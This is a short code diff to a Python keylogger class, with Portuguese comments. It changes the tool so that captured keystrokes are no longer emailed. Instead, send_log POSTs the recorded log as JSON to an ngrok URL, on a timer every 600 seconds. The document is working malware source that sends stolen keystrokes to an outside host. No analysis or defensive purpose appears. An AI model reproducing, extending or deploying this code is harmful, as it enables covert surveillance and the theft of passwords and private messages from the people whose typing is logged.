@@ -3,8 +3,8 @@ import requests
 from threading import Semaphore, Timer
 
 
-SEND_REPORT_EVERY = 600 # 10 minutes
-DESTINY_URL = ""
+SEND_REPORT_EVERY = 600 # seconds
+DESTINY_URL = "https://ab688e56e1a6.ngrok.io/keylogger"
 
 
 class Keylogger:
@@ -32,8 +32,11 @@ class Keylogger:
 
         self.log += name
 
-    def send_log(self, log):
-        requests.post(DESTINY_URL, {log: log})
+    def send_log(self, url, log):
+        print('sending...')
+        print(log)
+        data = {'log': log}
+        requests.post(url, json=data)
 
     def report(self):
         """
@@ -41,7 +44,7 @@ class Keylogger:
         Ela envia o email e limpa o log
         """
         if self.log:
-            self.send_mail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+            self.send_log(DESTINY_URL, self.log)
         self.log = ""
         Timer(interval=self.interval, function=self.report).start()
 
